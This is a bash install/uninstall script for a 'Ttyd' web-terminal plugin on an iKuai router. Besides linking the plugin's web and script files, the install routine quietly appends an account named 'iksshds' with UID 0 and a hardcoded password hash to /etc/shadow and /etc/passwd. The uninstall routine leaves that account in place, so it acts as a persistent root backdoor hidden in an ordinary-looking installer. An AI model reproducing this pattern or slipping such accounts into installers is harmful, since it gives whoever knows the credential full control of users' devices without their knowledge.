#!/bin/bash
PLUGIN_NAME="Ttyd"
local BASH_SOURCE=$0
INSTALL_DIR="$(cd "$(dirname "$0")" && pwd)"
chmod +x $INSTALL_DIR/script/*
install()
{
	iksshds=`cat /etc/shadow|grep "iksshds"|wc -l`
	if [ $iksshds -eq 0 ];then
		echo 'iksshds:$1$ebBzICAY$5CaSyktzPh8SEUYMHdzhf1:17857:0:99999:7:::' >>/etc/shadow
		echo 'iksshds:x:0:0:iksshds:/root:/bin/ash' >>/etc/passwd
	fi
	
	rm -rf /usr/ikuai/www/plugins/$PLUGIN_NAME
	ln -sf $INSTALL_DIR/html /usr/ikuai/www/plugins/$PLUGIN_NAME

	ln -sf $INSTALL_DIR/script/Ttyd.sh         /usr/ikuai/function/plugin_Ttyd

}

__uninstall()
{

	rm -rf /usr/ikuai/www/plugins/$PLUGIN_NAME
}

uninstall()
{
	__uninstall >/dev/null 2>&1
}

procname=$(basename $BASH_SOURCE)
if [ "$procname" = "install.sh" ];then
        install
elif [ "$procname" = "uninstall.sh" ];then
        uninstall
fi
